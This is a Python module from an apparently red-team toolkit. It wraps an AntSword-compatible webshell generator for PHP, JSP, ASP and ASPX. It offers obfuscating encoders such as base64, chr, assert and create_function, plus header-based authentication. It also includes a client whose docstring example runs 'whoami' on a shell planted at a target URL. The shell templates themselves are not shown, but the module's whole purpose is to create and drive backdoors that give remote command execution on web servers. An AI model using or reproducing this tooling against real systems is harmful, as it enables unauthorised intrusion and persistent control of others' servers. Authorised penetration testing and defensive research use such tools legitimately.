"""
Webshell generation module for AntSword protocol compatibility.

Provides:
- Template-based webshell generation for PHP, JSP, ASP, ASPX
- Factory pattern for generating operation code snippets
- HTTP client for communicating with deployed webshells
- Custom template support
- Authentication header support
- Utility functions for common red team operations

Example:
    >>> from ofx.api.webshells import PhpShell, generate_webshell, WebShellFactory, WebShellClient
    >>>
    >>> # Generate PHP webshell with authentication
    >>> shell = PhpShell(
    ...     password="x",
    ...     encoder="base64",
    ...     secret_header="X-Auth-Token",
    ...     secret_value="my-secret-key"
    ... )
    >>> code = shell.get_webshell()
    >>>
    >>> # Use convenience function
    >>> code = generate_webshell('php', password='pass', encoder='chr')
    >>>
    >>> # Generate operation code with factory
    >>> cmd_code = WebShellFactory.run_command('python', 'id')
    >>>
    >>> # Communicate with deployed webshell using client
    >>> with WebShellClient('http://target.com/shell.php', password='x') as client:
    ...     result = client.run_command('whoami')
"""

from typing import Optional

from ofx.api.webshell.base import WebShell
from ofx.api.webshell.client import WebShellClient
from ofx.api.webshell.factory import WebShellCodeFactory
from ofx.api.webshell.shell.asp import AspShell
from ofx.api.webshell.shell.aspx import AspxShell
from ofx.api.webshell.shell.jsp import JspShell
from ofx.api.webshell.shell.php import PhpShell

__all__ = [
    "WebShell",
    "PhpShell",
    "JspShell",
    "AspShell",
    "AspxShell",
    "WebShellCodeFactory",
    "WebShellClient",
    "generate_webshell",
]


def generate_webshell(
    language: str,
    password: str = "pass",
    encoder: str = "default",
    secret_header: Optional[str] = None,
    secret_value: Optional[str] = None,
    inline: bool = False,
) -> str:
    """
    Generate an AntSword-compatible webshell for the specified language.

    Args:
        language: Language identifier - 'php', 'jsp', 'asp', 'aspx'
        password: Password parameter name (default: 'pass')
        encoder: Encoding type - varies by language (default: 'default')
            - PHP: 'default', 'base64', 'chr', 'assert', 'create_function', 'callback', 'one_liner'
            - JSP: 'default', 'base64', 'script_engine'
            - ASP: 'default', 'eval'
            - ASPX: 'default', 'base64', 'jscript'
        secret_header: Optional HTTP header name for authentication (e.g., 'X-Auth-Token')
        secret_value: Optional HTTP header value for authentication
        inline: Remove whitespace for inline usage (default: False)

    Returns:
        Webshell code as string

    Example:
        >>> # Basic PHP webshell
        >>> shell = generate_webshell('php', password='x', encoder='base64')
        >>>
        >>> # JSP webshell with authentication
        >>> shell = generate_webshell(
        ...     'jsp',
        ...     password='cmd',
        ...     secret_header='X-Auth-Token',
        ...     secret_value='secret123',
        ...     inline=True
        ... )
    """
    language = language.lower()

    shells = {
        "php": PhpShell,
        "jsp": JspShell,
        "java": JspShell,
        "asp": AspShell,
        "aspx": AspxShell,
    }

    if language not in shells:
        raise ValueError(
            f"Unsupported language: {language}. Supported: {', '.join(shells.keys())}"
        )

    shell_class = shells[language]
    shell = shell_class(
        password=password,
        encoder=encoder,
        secret_header=secret_header,
        secret_value=secret_value,
    )

    return shell.get_webshell(inline=inline)
